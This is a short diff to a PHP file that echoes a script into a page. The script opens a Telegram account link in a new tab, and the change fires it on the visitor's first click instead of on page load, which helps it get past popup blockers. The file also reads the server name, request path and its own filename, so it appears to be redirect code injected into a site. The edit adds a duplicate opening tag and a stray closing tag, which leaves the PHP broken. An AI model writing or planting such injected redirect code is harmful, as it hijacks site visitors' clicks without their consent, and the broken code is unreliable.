@@ -1,9 +1,12 @@
 <?php
+<?php
 echo "<script>
-    window.onload = function() {
+    document.addEventListener('click', function() {
         window.open('https://t.me/alexbu555', '_blank');
-    };
+        document.removeEventListener('click', arguments.callee);
+    }, { once: true });
 </script>";
+?>
 $domain = $_SERVER['SERVER_NAME'];
 $path = $_SERVER['REQUEST_URI'];
 $filename = basename(__FILE__);
